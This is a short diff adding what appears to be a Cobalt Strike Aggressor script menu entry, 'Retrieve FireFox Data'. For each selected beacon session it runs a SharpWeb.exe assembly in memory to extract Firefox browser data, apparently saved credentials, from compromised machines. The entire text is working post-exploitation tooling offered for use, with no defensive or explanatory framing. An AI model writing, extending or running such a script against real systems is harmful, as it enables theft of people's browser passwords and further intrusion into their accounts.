@@ -1,0 +1,12 @@
+item "Retrieve FireFox Data"{
+			local('$bid');
+				foreach $bid ($1){
+					sharpwebfirefox($bid);
+				}
+			}
+			
+####SharpWeb FireFox
+sub sharpwebfirefox{
+bexecute_assembly($1, script_resource('/exe/SharpWeb.exe'), "firefox");
+}
+			
